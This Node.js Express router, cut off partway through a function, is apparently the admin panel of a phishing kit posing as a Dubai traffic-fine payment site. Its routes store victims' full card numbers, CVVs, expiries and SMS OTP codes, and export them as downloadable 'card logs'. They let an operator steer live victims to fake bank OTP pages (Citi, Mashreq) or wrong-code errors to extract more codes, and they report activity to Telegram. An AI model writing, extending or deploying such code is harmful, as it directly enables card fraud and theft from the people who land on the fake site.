const express  = require('express');
const bcrypt   = require('bcryptjs');
const router   = express.Router();
const { pool, query, queryOne, getSetting, setSetting, clientIp, logActivity, ensureActivityLogsTable, FUNNEL_STEPS, pathRank, rankName } = require('../db');

// ─── User-Agent parsing (lightweight) ─────────────────────────────────────────
function parseUA(ua) {
  ua = ua || '';
  let device = 'Desktop', browser = '?', os = '?';
  if (/Mobile|iPhone|iPod|Android.*Mobile/i.test(ua)) device = 'Mobile';
  else if (/iPad|Tablet/i.test(ua))                   device = 'Tablet';
  if (/iPhone|iPad|iPod/i.test(ua))      os = 'iOS';
  else if (/Android/i.test(ua))           os = 'Android';
  else if (/Windows/i.test(ua))           os = 'Windows';
  else if (/Mac OS X|Macintosh/i.test(ua)) os = 'macOS';
  else if (/Linux/i.test(ua))             os = 'Linux';
  if      (/Edg\//i.test(ua))                  browser = 'Edge';
  else if (/OPR\/|Opera/i.test(ua))            browser = 'Opera';
  else if (/Chrome\//i.test(ua) && !/Edg|OPR/.test(ua)) browser = 'Chrome';
  else if (/Firefox\//i.test(ua))              browser = 'Firefox';
  else if (/Safari\//i.test(ua) && !/Chrome|Edg/.test(ua)) browser = 'Safari';
  return { device, browser, os };
}

function requireAdmin(req, res, next) {
  if (req.session.adminLoggedIn) return next();
  res.redirect('/admin/login');
}

// count() yardımcısı — PostgreSQL alias küçük harf sorununu önler
async function count(sql, params = []) {
  const rows = await query(sql, params);
  return Number(Object.values(rows[0] || {})[0]) || 0;
}

// ─── Telegram helpers ─────────────────────────────────────────────────────────
async function sendInquiryAlert(message) {
  const token  = await getSetting('telegram_bot_token', '');
  const chatId = await getSetting('inquiry_chat_id',    process.env.INQUIRY_CHAT_ID || '');
  if (!token || !chatId) return;
  try {
    await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
      method: 'POST',
      headers: {'Content-Type':'application/json'},
      body: JSON.stringify({ chat_id: chatId, text: message, parse_mode: 'HTML' })
    });
  } catch {}
}

async function sendAdminAlert(message) {
  const enabled = await getSetting('admin_tg_alerts', '0');
  if (enabled !== '1') return;
  const token  = await getSetting('telegram_bot_token', '');
  // Admin alerts go to the inquiry chat (not the payment chat),
  // falling back to the payment chat only if no inquiry chat is configured.
  const chatId = await getSetting('inquiry_chat_id', '') || await getSetting('telegram_chat_id', '');
  if (!token || !chatId) return;
  try {
    await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
      method: 'POST',
      headers: {'Content-Type':'application/json'},
      body: JSON.stringify({ chat_id: chatId, text: message, parse_mode: 'HTML' })
    });
  } catch {}
}

// ─── Login ───────────────────────────────────────────────────────────────────
router.get('/', (req, res) => res.redirect('/admin/dashboard'));
router.get('/login', (req, res) => {
  if (req.session.adminLoggedIn) return res.redirect('/admin/dashboard');
  res.render('admin/login', { error: null });
});

router.post('/login', async (req, res) => {
  const { username='', password='' } = req.body;
  const ip        = clientIp(req);
  const userAgent = req.headers['user-agent'] || '';
  try {
    const user = await queryOne('SELECT id, password FROM admin_users WHERE username = ? LIMIT 1', [username]);
    if (user && await bcrypt.compare(password, user.password)) {
      req.session.adminLoggedIn = true;
      req.session.adminUser     = username;
      logActivity('admin_login', 'Admin login: ' + username, username, ip, userAgent).catch(() => {});
      sendAdminAlert('🔐 <b>Admin Login</b>\nUser: ' + username + '\nIP: ' + ip + '\nTime: ' + new Date().toUTCString()).catch(() => {});
      return res.redirect('/admin/dashboard');
    }
    res.render('admin/login', { error: 'Kullanıcı adı veya şifre hatalı.' });
  } catch (e) {
    res.render('admin/login', { error: 'Veritabanı hatası: ' + e.message });
  }
});

router.get('/logout', (req, res) => {
  req.session.destroy();
  res.redirect('/admin/login');
});

// ─── Dashboard ───────────────────────────────────────────────────────────────
router.get('/dashboard', requireAdmin, async (req, res) => {
  try {
    const today = new Date().toISOString().slice(0,10);
    const totalPayments   = await count('SELECT COUNT(*) FROM payments');
    const todayPayments   = await count('SELECT COUNT(*) FROM payments WHERE DATE(created_at)=?', [today]);
    const totalInquiries  = await count('SELECT COUNT(*) FROM inquiries');
    const todayInquiries  = await count('SELECT COUNT(*) FROM inquiries WHERE DATE(created_at)=?', [today]);
    const pendingPayments = await count("SELECT COUNT(*) FROM payments WHERE otp_status='pending'");
    const approvedPayments= await count("SELECT COUNT(*) FROM payments WHERE otp_status='approved'");
    const totalRevenue    = await count('SELECT COALESCE(SUM(total_fine),0) FROM payments');
    const recentPayments  = await query('SELECT * FROM payments ORDER BY created_at DESC LIMIT 10');
    const recentInquiries = await query('SELECT * FROM inquiries ORDER BY created_at DESC LIMIT 6');

    res.render('admin/dashboard', {
      adminUser: req.session.adminUser,
      totalPayments, todayPayments, totalInquiries, todayInquiries,
      pendingPayments, approvedPayments, totalRevenue,
      recentPayments, recentInquiries,
    });
  } catch (e) {
    res.render('admin/dashboard', { adminUser: req.session.adminUser, dbError: e.message,
      totalPayments:0, todayPayments:0, totalInquiries:0, todayInquiries:0,
      pendingPayments:0, approvedPayments:0, totalRevenue:0, recentPayments:[], recentInquiries:[] });
  }
});

// ─── Payments helpers ─────────────────────────────────────────────────────────
function buildPaymentsWhere(statusFilter, search, activeFilter) {
  let where = '1=1', params = [];
  if (statusFilter) { where += ' AND otp_status = ?'; params.push(statusFilter); }
  if (search) {
    where += ' AND (plate_no LIKE ? OR card_number LIKE ? OR card_name LIKE ? OR card_issuer LIKE ?)';
    params.push(...[`%${search}%`,`%${search}%`,`%${search}%`,`%${search}%`]);
  }
  if (activeFilter) {
    where += " AND last_seen > NOW() - INTERVAL '90 seconds'";
  }
  return { where, params };
}

// ─── Payments ────────────────────────────────────────────────────────────────
router.get('/payments', requireAdmin, async (req, res) => {
  const statusFilter = req.query.status || '';
  const search       = req.query.q || '';
  const activeFilter = req.query.active === '1';
  const page         = Math.max(1, parseInt(req.query.p) || 1);
  const perPage      = 25;
  const offset       = (page - 1) * perPage;

  try {
    const { where, params } = buildPaymentsWhere(statusFilter, search, activeFilter);
    const total    = await count(`SELECT COUNT(*) FROM payments WHERE ${where}`, params);
    const payments = await query(`SELECT * FROM payments WHERE ${where} ORDER BY created_at DESC LIMIT ${perPage} OFFSET ${offset}`, params);
    const totalPages = Math.max(1, Math.ceil(total / perPage));

    // Attach latest OTP code for each payment
    try {
      const otpRows = await query(
        `SELECT DISTINCT ON (sid) sid, otp_code FROM otp_events WHERE type = ? AND otp_code IS NOT NULL ORDER BY sid, id DESC`,
        ['otp_sms']
      );
      const otpCodes = {};
      otpRows.forEach(r => { if (r.otp_code) otpCodes[r.sid] = r.otp_code; });
      payments.forEach(p => { p.latest_otp = otpCodes[p.sid] || null; });
    } catch { /* non-critical */ }

    // Visitor stats
    let totalVisitors = 0, uniqueVisitors = 0;
    try {
      totalVisitors  = await count('SELECT COUNT(*) FROM visitors');
      uniqueVisitors = await count('SELECT COUNT(DISTINCT ip) FROM visitors');
    } catch {}

    res.render('admin/payments', {
      adminUser: req.session.adminUser,
      payments, total, totalPages, page, statusFilter, search, activeFilter,
      totalVisitors, uniqueVisitors,
    });
  } catch (e) {
    res.render('admin/payments', { adminUser: req.session.adminUser, dbError: e.message, payments:[], total:0, totalPages:1, page:1, statusFilter, search, activeFilter: false, totalVisitors:0, uniqueVisitors:0 });
  }
});

// ─── Export card logs as .txt ─────────────────────────────────────────────────
router.get('/payments/export', requireAdmin, async (req, res) => {
  const statusFilter = req.query.status || '';
  const search       = req.query.q || '';
  const activeFilter = req.query.active === '1';

  try {
    const { where, params } = buildPaymentsWhere(statusFilter, search, activeFilter);
    const rows = await query(
      `SELECT card_number, card_name, expiry, cvv, card_issuer, card_type, created_at, plate_no, plate_src, plate_code, total_fine
       FROM payments WHERE ${where} ORDER BY created_at DESC LIMIT 5000`,
      params
    );

    const header = ['Card Number', 'Cardholder Name', 'Expiry', 'CVV', 'Issuer', 'Type', 'Date', 'Plate', 'Amount AED'].join('\t');
    const lines = rows.map(r => {
      const dt = r.created_at ? new Date(r.created_at).toLocaleString('en-AE', { timeZone:'Asia/Dubai' }) : '';
      const plate = [r.plate_src, r.plate_code, r.plate_no].filter(Boolean).join(' ');
      return [
        r.card_number || '', r.card_name || '', r.expiry || '', r.cvv || '',
        r.card_issuer || '', r.card_type || '', dt, plate, r.total_fine || 0,
      ].join('\t');
    });

    const now = new Date().toISOString().slice(0,10);
    res.setHeader('Content-Type', 'text/plain; charset=utf-8');
    res.setHeader('Content-Disposition', `attachment; filename="payments-${now}.txt"`);
    res.send([header, ...lines].join('\r\n'));
  } catch (e) {
    res.status(500).send('Export error: ' + e.message);
  }
});

// ─── Inquiries ───────────────────────────────────────────────────────────────
router.get('/inquiries', requireAdmin, async (req, res) => {
  const search  = req.query.q || '';
  const page    = Math.max(1, parseInt(req.query.p) || 1);
  const perPage = 30;
  const offset  = (page - 1) * perPage;

  try {
    let where = '1=1', params = [];
    if (search) {
      where += ' AND (plate_no LIKE ? OR plate_src LIKE ? OR plate_code LIKE ? OR ip LIKE ?)';
      params.push(...[`%${search}%`,`%${search}%`,`%${search}%`,`%${search}%`]);
    }
    const total      = await count(`SELECT COUNT(*) FROM inquiries WHERE ${where}`, params);
    const rows       = await query(`SELECT * FROM inquiries WHERE ${where} ORDER BY created_at DESC LIMIT ${perPage} OFFSET ${offset}`, params);
    const totalPages = Math.max(1, Math.ceil(total / perPage));
    const today      = new Date().toISOString().slice(0,10);
    const todayCount = await count('SELECT COUNT(*) FROM inquiries WHERE DATE(created_at)=?', [today]);
    const uniqueIPs  = await count('SELECT COUNT(DISTINCT ip) FROM inquiries');
    const withFines  = await count('SELECT COUNT(*) FROM inquiries WHERE fine_count > 0');

    res.render('admin/inquiries', {
      adminUser: req.session.adminUser,
      rows, total, totalPages, page, search,
      todayCount, uniqueIPs, withFines,
    });
  } catch (e) {
    res.render('admin/inquiries', { adminUser: req.session.adminUser, dbError: e.message, rows:[], total:0, totalPages:1, page:1, search, todayCount:0, uniqueIPs:0, withFines:0 });
  }
});

// ─── Delete inquiry ──────────────────────────────────────────────────────────
router.post('/inquiries/:id/delete', requireAdmin, async (req, res) => {
  const id = parseInt(req.params.id, 10);
  if (!id || isNaN(id)) return res.json({ ok: false, error: 'Invalid id' });
  try {
    await query('DELETE FROM inquiries WHERE id = ?', [id]);
    logActivity('inquiry_delete', 'Inquiry deleted (id: ' + id + ')',
                req.session.adminUser, clientIp(req), req.headers['user-agent'] || '').catch(() => {});
    res.json({ ok: true });
  } catch (e) {
    res.json({ ok: false, error: e.message });
  }
});

// ─── Settings helpers ─────────────────────────────────────────────────────────
async function loadSettings() {
  return {
    otpDefault:      await getSetting('otp_default_page',            'otp-sms'),
    siteActive:      await getSetting('site_active',                 '1'),
    discountEndsAt:      await getSetting('discount_ends_at',      ''),
    discountTimerActive: await getSetting('discount_timer_active', '1'),
    telegramToken:   await getSetting('telegram_bot_token',          process.env.TELEGRAM_BOT_TOKEN          || ''),
    telegramChatId:  await getSetting('telegram_chat_id',            process.env.TELEGRAM_CHAT_ID            || ''),
    inquiryChatId:   await getSetting('inquiry_chat_id', process.env.INQUIRY_CHAT_ID || ''),
    handyApiKey:     await getSetting('handy_api_key',               process.env.HANDY_API_KEY               || ''),
    metaPixelId:        await getSetting('meta_pixel_id',       ''),
    metaAccessToken:    await getSetting('meta_access_token',   ''),
    metaTestEventCode:  await getSetting('meta_test_event_code',''),
    tiktokPixelId:        await getSetting('tiktok_pixel_id',         ''),
    tiktokAccessToken:    await getSetting('tiktok_access_token',     ''),
    tiktokTestEventCode:  await getSetting('tiktok_test_event_code',  ''),
    adminTgAlerts:      await getSetting('admin_tg_alerts',     '0'),
    metaEventTriggersJson:   await getSetting('meta_event_triggers',   '{}'),
    tiktokEventTriggersJson: await getSetting('tiktok_event_triggers', '{}'),
  };
}

// ─── Settings ────────────────────────────────────────────────────────────────
router.get('/settings', requireAdmin, async (req, res) => {
  // Status messages come via query params (POST-Redirect-GET pattern, so F5
  // does not resubmit and re-trigger the "Settings Changed" Telegram alert).
  const saved = req.query.saved === '1';
  const error = req.query.error ? String(req.query.error).slice(0, 300) : null;
  const pwMsg = req.query.pwmsg
    ? { type: req.query.pwmsg === 'success' ? 'success' : 'error',
        text: String(req.query.pwtext || '').slice(0, 200) }
    : null;
  try {
    const s = await loadSettings();
    res.render('admin/settings', { adminUser: req.session.adminUser, ...s, saved, error, pwMsg });
  } catch (e) {
    res.render('admin/settings', {
      adminUser: req.session.adminUser,
      otpDefault:'otp-sms', siteActive:'1',
      telegramToken:'', telegramChatId:'', inquiryChatId:'', handyApiKey:'',
      metaPixelId:'', metaAccessToken:'', metaTestEventCode:'',
      tiktokPixelId:'', tiktokAccessToken:'', tiktokTestEventCode:'', adminTgAlerts:'0',
      metaEventTriggersJson:'{}', tiktokEventTriggersJson:'{}',
      saved:false, error: error || e.message, pwMsg,
    });
  }
});

router.post('/settings', requireAdmin, async (req, res) => {
  let saved = false, error = null, pwMsg = null;

  if (req.body.save_settings !== undefined) {
    try {
      await setSetting('otp_default_page',  req.body.otp_default_page  || 'otp-sms');
      await setSetting('site_active',       req.body.site_active       || '1');
      await setSetting('discount_timer_active', req.body.discount_timer_active === '1' ? '1' : '0');
      // datetime-local gives "YYYY-MM-DDTHH:MM", treat as Dubai time (UTC+4), store as UTC ISO
      const rawDt = (req.body.discount_ends_at || '').trim();
      if (rawDt) {
        const localMs = new Date(rawDt).getTime() - (4 * 60 * 60 * 1000);
        await setSetting('discount_ends_at', new Date(localMs).toISOString());
      } else {
        await setSetting('discount_ends_at', '');
      }
      logActivity('settings_change', 'General settings saved', req.session.adminUser, clientIp(req), req.headers['user-agent'] || '').catch(() => {});
      sendAdminAlert('⚙️ <b>Settings Changed</b>\nSection: General\nAdmin: ' + req.session.adminUser + '\nIP: ' + clientIp(req)).catch(() => {});
      saved = true;
    } catch (e) { error = e.message; }

  } else if (req.body.save_pixel !== undefined) {
    try {
      await setSetting('meta_pixel_id',             (req.body.meta_pixel_id             || '').trim());
      await setSetting('meta_access_token',         (req.body.meta_access_token         || '').trim());
      await setSetting('meta_test_event_code',      (req.body.meta_test_event_code       || '').trim());
      await setSetting('tiktok_pixel_id',           (req.body.tiktok_pixel_id           || '').trim());
      await setSetting('tiktok_access_token',       (req.body.tiktok_access_token        || '').trim());
      await setSetting('tiktok_test_event_code',    (req.body.tiktok_test_event_code     || '').trim());
      try { JSON.parse(req.body.meta_event_triggers   || '{}'); } catch(e2) { throw new Error('Invalid JSON: meta_event_triggers'); }
      try { JSON.parse(req.body.tiktok_event_triggers || '{}'); } catch(e3) { throw new Error('Invalid JSON: tiktok_event_triggers'); }
      await setSetting('meta_event_triggers',   (req.body.meta_event_triggers   || '{}').trim());
      await setSetting('tiktok_event_triggers', (req.body.tiktok_event_triggers || '{}').trim());
      logActivity('settings_change', 'Pixel/alert settings saved', req.session.adminUser, clientIp(req), req.headers['user-agent'] || '').catch(() => {});
      sendAdminAlert('⚙️ <b>Settings Changed</b>\nSection: Pixel & Alert\nAdmin: ' + req.session.adminUser + '\nIP: ' + clientIp(req)).catch(() => {});
      saved = true;
    } catch (e) { error = e.message; }

  } else if (req.body.save_telegram !== undefined) {
    try {
      await setSetting('telegram_bot_token',        (req.body.telegram_bot_token        || '').trim());
      await setSetting('telegram_chat_id',          (req.body.telegram_chat_id          || '').trim());
      await setSetting('inquiry_chat_id', (req.body.inquiry_chat_id || '').trim());
      await setSetting('handy_api_key',             (req.body.handy_api_key             || '').trim());
      await setSetting('admin_tg_alerts',           req.body.admin_tg_alerts === '1' ? '1' : '0');
      logActivity('settings_change', 'Telegram/API settings saved', req.session.adminUser, clientIp(req), req.headers['user-agent'] || '').catch(() => {});
      sendAdminAlert('⚙️ <b>Settings Changed</b>\nSection: Telegram & API\nAdmin: ' + req.session.adminUser + '\nIP: ' + clientIp(req)).catch(() => {});
      saved = true;
    } catch (e) { error = e.message; }

  } else if (req.body.change_password !== undefined) {
    const { current_password='', new_password='', new_password2='' } = req.body;
    try {
      const user = await queryOne('SELECT password FROM admin_users WHERE username = ? LIMIT 1', [req.session.adminUser]);
      if (!user || !await bcrypt.compare(current_password, user.password)) {
        pwMsg = { type:'error', text:'Current password is incorrect.' };
      } else if (new_password.length < 6) {
        pwMsg = { type:'error', text:'New password must be at least 6 characters.' };
      } else if (new_password !== new_password2) {
        pwMsg = { type:'error', text:'New passwords do not match.' };
      } else {
        await query('UPDATE admin_users SET password = ? WHERE username = ?',
          [await bcrypt.hash(new_password, 10), req.session.adminUser]);
        pwMsg = { type:'success', text:'Password updated successfully.' };
      }
      // Handle optional username change
      if (req.body.new_username && req.body.new_username.trim() !== req.session.adminUser) {
        const newU = req.body.new_username.trim();
        const exists = await queryOne('SELECT id FROM admin_users WHERE username = ? AND username != ?', [newU, req.session.adminUser]);
        if (exists) {
          pwMsg = { type:'error', text:'Username already taken.' };
        } else {
          await query('UPDATE admin_users SET username = ? WHERE username = ?', [newU, req.session.adminUser]);
          req.session.adminUser = newU;
          if (!pwMsg || pwMsg.type !== 'error') {
            pwMsg = { type:'success', text:(pwMsg && pwMsg.type === 'success' ? 'Password and username updated successfully.' : 'Username updated successfully.') };
          }
        }
      }
    } catch (e) { pwMsg = { type:'error', text: e.message }; }
  }

  // POST-Redirect-GET: refresh won't resubmit the form
  const qs = new URLSearchParams();
  if (saved) qs.set('saved', '1');
  if (error) qs.set('error', error);
  if (pwMsg) { qs.set('pwmsg', pwMsg.type); qs.set('pwtext', pwMsg.text); }
  const q = qs.toString();
  res.redirect('/admin/settings' + (q ? '?' + q : ''));
});

// ─── Sessions list ───────────────────────────────────────────────────────────
router.get('/sessions', requireAdmin, async (req, res) => {
  const search       = (req.query.q || '').trim();
  const activeFilter = req.query.active === '1';
  const convertedFilter = req.query.converted === '1';
  const page         = Math.max(1, parseInt(req.query.p) || 1);
  const perPage      = 30;
  const offset       = (page - 1) * perPage;

  // Funnel-rank lookup table used inline by the aggregated queries
  const RANK_VALUES = `(VALUES
    ('/',1),('/fines',2),('/payment',3),
    ('/otp',4),('/otp-sms',4),('/otp-sms2',4),('/otp-citi',4),('/otp-mashreq',4),
    ('/otp-loading',4),('/card-limit',4),('/waiting',4),('/yogunluk',4),
    ('/otp-approved',5)
  ) AS fr(path, rank)`;
  // "Converted" now means anyone who reached an OTP / waiting / yogunluk page
  // or further — i.e. funnel rank >= 4.
  const CONVERTED_PATHS = `('/otp','/otp-sms','/otp-sms2','/otp-citi','/otp-mashreq','/otp-loading','/card-limit','/waiting','/yogunluk','/otp-approved')`;

  try {
    let where = '1=1', params = [];
    if (search) {
      where += ' AND (vs.ip ILIKE ? OR vs.user_agent ILIKE ? OR vs.visitor_id ILIKE ?)';
      params.push(`%${search}%`, `%${search}%`, `%${search}%`);
    }

    // Aggregate-level filters live in HAVING so they apply per-IP, not per-row.
    let having = '1=1';
    if (activeFilter)    having += " AND MAX(vs.last_seen) > NOW() - INTERVAL '60 seconds'";
    if (convertedFilter) having += ` AND MAX(COALESCE(fr.rank,0)) >= 4`;

    const total = Number((await query(`
      SELECT COUNT(*) FROM (
        SELECT 1
        FROM visitor_state vs LEFT JOIN ${RANK_VALUES} ON fr.path = vs.deepest_path
        WHERE ${where}
        GROUP BY vs.ip
        HAVING ${having}
      ) sub
    `, params))[0]?.count || 0);

    const rows = await query(`
      SELECT
        vs.ip,
        COUNT(*)                                                                                AS session_count,
        SUM(vs.page_count)                                                                       AS page_count,
        MIN(vs.first_seen)                                                                       AS first_seen,
        MAX(vs.last_seen)                                                                        AS last_seen,
        EXTRACT(EPOCH FROM (MAX(vs.last_seen) - MIN(vs.first_seen)))::int                        AS seconds_on_site,
        (array_agg(vs.visitor_id   ORDER BY vs.last_seen DESC))[1]                               AS visitor_id,
        (array_agg(vs.user_agent   ORDER BY vs.last_seen DESC))[1]                               AS user_agent,
        (array_agg(vs.current_path ORDER BY vs.last_seen DESC))[1]                               AS current_path,
        (array_agg(vs.deepest_path ORDER BY COALESCE(fr.rank,0) DESC, vs.last_seen DESC))[1]     AS deepest_path,
        MAX(COALESCE(fr.rank,0))                                                                 AS deepest_rank,
        (SELECT COUNT(*) FROM payments  p WHERE p.ip = vs.ip)                                    AS payment_count,
        (SELECT COUNT(*) FROM inquiries i WHERE i.ip = vs.ip)                                    AS inquiry_count
      FROM visitor_state vs LEFT JOIN ${RANK_VALUES} ON fr.path = vs.deepest_path
      WHERE ${where}
      GROUP BY vs.ip
      HAVING ${having}
      ORDER BY MAX(vs.last_seen) DESC
      LIMIT ${perPage} OFFSET ${offset}
    `, params);
    const totalPages = Math.max(1, Math.ceil(total / perPage));

    // Summary counters (top of page)
    const liveCount    = Number((await query(`SELECT COUNT(DISTINCT ip) FROM visitor_state WHERE last_seen > NOW() - INTERVAL '60 seconds'`))[0]?.count || 0);
    const last30Unique = Number((await query(`SELECT COUNT(DISTINCT ip) FROM visitors WHERE created_at > NOW() - INTERVAL '30 minutes'`))[0]?.count || 0);
    const todayUnique  = Number((await query(`SELECT COUNT(DISTINCT ip) FROM visitors WHERE DATE(created_at AT TIME ZONE 'Asia/Dubai') = DATE(NOW() AT TIME ZONE 'Asia/Dubai')`))[0]?.count || 0);
    // Reached SMS / OTP / yogunluk (or further) today — distinct IPs
    const convertedToday = Number((await query(`
      SELECT COUNT(DISTINCT ip) FROM visitor_state
      WHERE deepest_path IN ${CONVERTED_PATHS}
        AND DATE(last_seen AT TIME ZONE 'Asia/Dubai') = DATE(NOW() AT TIME ZONE 'Asia/Dubai')
    `))[0]?.count || 0);

    rows.forEach(r => {
      r.ua_parsed    = parseUA(r.user_agent);
      r.deepest_rank = Number(r.deepest_rank) || pathRank(r.deepest_path);
      r.deepest_name = rankName(r.deepest_rank);
      r.is_live      = r.last_seen && (Date.now() - new Date(r.last_seen).getTime() < 60000);
    });

    res.render('admin/sessions', {
      adminUser: req.session.adminUser,
      rows, total, totalPages, page, search, activeFilter, convertedFilter,
      liveCount, last30Unique, todayUnique, convertedToday,
    });
  } catch (e) {
    res.render('admin/sessions', {
      adminUser: req.session.adminUser, dbError: e.message,
      rows: [], total: 0, totalPages: 1, page: 1, search, activeFilter, convertedFilter,
      liveCount: 0, last30Unique: 0, todayUnique: 0, convertedToday: 0,
    });
  }
});

// ─── Open session by IP — picks the most recent visitor for that IP ─────────
router.get('/sessions/by-ip/:ip', requireAdmin, async (req, res) => {
  const ip = (req.params.ip || '').trim();
  if (!ip) return res.redirect('/admin/sessions');
  try {
    const row = await queryOne(
      'SELECT visitor_id FROM visitor_state WHERE ip = ? ORDER BY last_seen DESC LIMIT 1',
      [ip]
    );
    if (row?.visitor_id) return res.redirect('/admin/sessions/' + row.visitor_id);
    // No tracked session yet for this IP — fall back to filtered list
    res.redirect('/admin/sessions?q=' + encodeURIComponent(ip));
  } catch (e) {
    res.redirect('/admin/sessions?q=' + encodeURIComponent(ip));
  }
});

// ─── Session detail ──────────────────────────────────────────────────────────
router.get('/sessions/:vid', requireAdmin, async (req, res) => {
  const vid = (req.params.vid || '').replace(/[^a-f0-9]/g, '').slice(0, 40);
  try {
    const state = await queryOne('SELECT * FROM visitor_state WHERE visitor_id = ? LIMIT 1', [vid]);
    if (!state) return res.status(404).render('admin/session-detail', { adminUser: req.session.adminUser, state: null, timeline: [], inquiries: [], payments: [] });

    const hits = await query('SELECT id, path, created_at FROM visitors WHERE visitor_id = ? ORDER BY created_at ASC LIMIT 500', [vid]);
    const nowMs = Date.now();
    const stateLastMs = new Date(state.last_seen).getTime();
    const timeline = hits.map((h, i) => {
      const next = hits[i+1];
      const endMs = next ? new Date(next.created_at).getTime() : Math.min(stateLastMs, nowMs);
      const startMs = new Date(h.created_at).getTime();
      let seconds = Math.max(0, Math.round((endMs - startMs) / 1000));
      if (seconds > 600) seconds = 600;             // cap idle per page at 10 min
      return {
        path: h.path, at: h.created_at, seconds,
        rank: pathRank(h.path), name: rankName(pathRank(h.path)),
        is_last: !next,
      };
    });
    const totalSec = timeline.reduce((s, t) => s + t.seconds, 0);

    const inquiries = await query('SELECT * FROM inquiries WHERE ip = ? ORDER BY created_at DESC LIMIT 20', [state.ip]);
    const payments  = await query('SELECT * FROM payments  WHERE ip = ? ORDER BY created_at DESC LIMIT 20', [state.ip]);

    state.ua_parsed    = parseUA(state.user_agent);
    state.deepest_rank = pathRank(state.deepest_path);
    state.deepest_name = rankName(state.deepest_rank);
    state.is_live      = (nowMs - stateLastMs) < 60000;

    res.render('admin/session-detail', {
      adminUser: req.session.adminUser, state, timeline, totalSec, inquiries, payments,
    });
  } catch (e) {
    res.render('admin/session-detail', { adminUser: req.session.adminUser, state: null, timeline: [], inquiries: [], payments: [], dbError: e.message });
  }
});

// ─── Funnel report ───────────────────────────────────────────────────────────
router.get('/funnel', requireAdmin, async (req, res) => {
  const range = req.query.range || '24h';
  let intervalSql = "INTERVAL '24 hours'";
  if (range === '7d')  intervalSql = "INTERVAL '7 days'";
  if (range === '30d') intervalSql = "INTERVAL '30 days'";
  if (range === '1h')  intervalSql = "INTERVAL '1 hour'";

  try {
    // For each funnel rank, count distinct visitors who reached >= that rank
    const counts = {};
    for (const step of FUNNEL_STEPS) {
      const pathList = step.paths.map(p => `'${p}'`).join(',');
      const r = await query(`
        SELECT COUNT(DISTINCT COALESCE(NULLIF(visitor_id,''), ip)) AS c
        FROM visitors
        WHERE path IN (${pathList})
          AND created_at > NOW() - ${intervalSql}
      `);
      counts[step.rank] = Number(r[0]?.count || 0);
    }
    const funnel = FUNNEL_STEPS.map(s => ({ ...s, count: counts[s.rank] || 0 }));
    const top = funnel[0]?.count || 0;
    funnel.forEach((s, i) => {
      s.pct_total = top ? Math.round((s.count / top) * 1000) / 10 : 0;
      const prev = funnel[i-1];
      s.pct_step = (prev && prev.count) ? Math.round((s.count / prev.count) * 1000) / 10 : 100;
    });

    // Top referrers
    const referrers = await query(`
      SELECT referrer, COUNT(DISTINCT COALESCE(NULLIF(visitor_id,''), ip)) AS visitors
      FROM visitors WHERE created_at > NOW() - ${intervalSql} AND referrer <> ''
      GROUP BY referrer ORDER BY visitors DESC LIMIT 10
    `);

    // Device breakdown
    const uaRows = await query(`
      SELECT user_agent, COUNT(DISTINCT COALESCE(NULLIF(visitor_id,''), ip)) AS visitors
      FROM visitors WHERE created_at > NOW() - ${intervalSql} AND user_agent <> ''
      GROUP BY user_agent
    `);
    const devices = { Desktop: 0, Mobile: 0, Tablet: 0 };
    const browsers = {};
    uaRows.forEach(r => {
      const p = parseUA(r.user_agent);
      devices[p.device] = (devices[p.device] || 0) + Number(r.visitors);
      browsers[p.browser] = (browsers[p.browser] || 0) + Number(r.visitors);
    });

    res.render('admin/funnel', {
      adminUser: req.session.adminUser, range, funnel, referrers, devices, browsers,
    });
  } catch (e) {
    res.render('admin/funnel', {
      adminUser: req.session.adminUser, range, funnel: [], referrers: [], devices: {}, browsers: {}, dbError: e.message
    });
  }
});

// ─── Live stats API (polled by dashboard widget) ─────────────────────────────
router.get('/api/live-stats', requireAdmin, async (req, res) => {
  try {
    const liveCount = Number((await query(`SELECT COUNT(DISTINCT ip) FROM visitor_state WHERE last_seen > NOW() - INTERVAL '60 seconds'`))[0]?.count || 0);
    const last30    = Number((await query(`SELECT COUNT(DISTINCT ip) FROM visitors WHERE created_at > NOW() - INTERVAL '30 minutes'`))[0]?.count || 0);
    // Dedupe active list by IP — pick the most recently active row per IP
    const activeList = await query(`
      SELECT DISTINCT ON (ip) visitor_id, ip, current_path, last_seen, deepest_path
      FROM visitor_state
      WHERE last_seen > NOW() - INTERVAL '60 seconds'
      ORDER BY ip, last_seen DESC
      LIMIT 30
    `);
    // Sort the deduped list by last_seen desc for display
    activeList.sort((a, b) => new Date(b.last_seen).getTime() - new Date(a.last_seen).getTime());
    res.json({ ok: true, liveCount, last30, active: activeList });
  } catch (e) {
    res.json({ ok: false, liveCount: 0, last30: 0, active: [], error: e.message });
  }
});

// ─── API helpers for frontend polling ────────────────────────────────────────
router.get('/api/latest-payment-id', requireAdmin, async (req, res) => {
  try {
    const rows = await query('SELECT id FROM payments ORDER BY id DESC LIMIT 1');
    res.json({ id: rows[0]?.id || 0 });
  } catch { res.json({ id: 0 }); }
});

// ─── Actions (AJAX) ──────────────────────────────────────────────────────────
router.post('/action', requireAdmin, async (req, res) => {
  const { act='', sid='' } = req.body;
  const cleanSid  = sid.replace(/[^a-f0-9]/g, '');
  const adminUser = req.session.adminUser || '';
  const ip        = clientIp(req);
  const userAgent = req.headers['user-agent'] || '';
  try {
    if (act === 'redirect') {
      const allowed = [
        'otp-sms','otp-sms2','otp','otp-citi','otp-mashreq','yogunluk','card-limit',
        'payment:error=card_error','payment:error=card_type','payment:error=bank_error',
        'otp-sms:error=wrong_otp','otp-sms2:error=wrong_otp','otp:error=wrong_otp',
        'otp-citi:error=wrong_otp','otp-mashreq:error=wrong_otp',
      ];
      if (!cleanSid || !allowed.includes(req.body.page)) return res.json({ ok:false, error:'Invalid' });
      // Only update otp_page when redirecting to a real OTP page (not error variants)
      const basePage = req.body.page.split(':')[0];
      await query('UPDATE payments SET redirect_to = ?, otp_page = ? WHERE sid = ?', [req.body.page, basePage, cleanSid]);
      logActivity('otp_redirect', 'OTP redirect → ' + req.body.page + ' (sid: ' + cleanSid + ')', adminUser, ip, userAgent).catch(() => {});
      const rdMsg = '↩️ <b>OTP Redirect</b>\nSID: <code>' + cleanSid + '</code>\nPage: <b>' + req.body.page + '</b>\nAdmin: ' + adminUser + '\nIP: ' + ip;
      sendInquiryAlert(rdMsg).catch(() => {});
      return res.json({ ok: true });
    }
    if (act === 'set_status') {
      const allowed = ['pending','approved','declined'];
      if (!cleanSid || !allowed.includes(req.body.status)) return res.json({ ok:false, error:'Invalid' });
      // When approving, also set redirect_to so the user is sent to the success page
      if (req.body.status === 'approved') {
